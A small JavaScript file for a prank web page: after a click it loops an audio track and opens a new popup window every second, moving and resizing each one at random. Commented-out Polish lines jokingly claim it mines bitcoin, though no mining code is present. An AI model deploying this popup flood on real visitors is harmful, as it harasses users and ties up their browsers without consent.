const music = new Audio('muza.mp3');

const main = () => {
    //console.log('szkajpurPompa')
    //console.log('jak cos to kopie wlasnie bitcoina na twoim kompie iksde')

}

addEventListener('DOMContentLoaded', () => {
    main();
})

addEventListener('click', () => {
    music.loop = true;
    music.play();

    setInterval(() => {
        new NewWindow();
    }, 1000);

});

class NewWindow {
    constructor() {
        const win = window.open('', '_blank', "location=yes,height=150,width=150,scrollbars=yes,status=yes");
        if (!win) return;

        win.document.write('<html><body></body></html>')

        setInterval(() => {
            let w = Math.random() * parseInt(window.screen.availWidth.toString());
            let h = Math.random() * parseInt(window.screen.availHeight.toString());
            win.resizeTo(w, h);
            win.moveTo(w, h)
        }, 500);
    }
}

export { }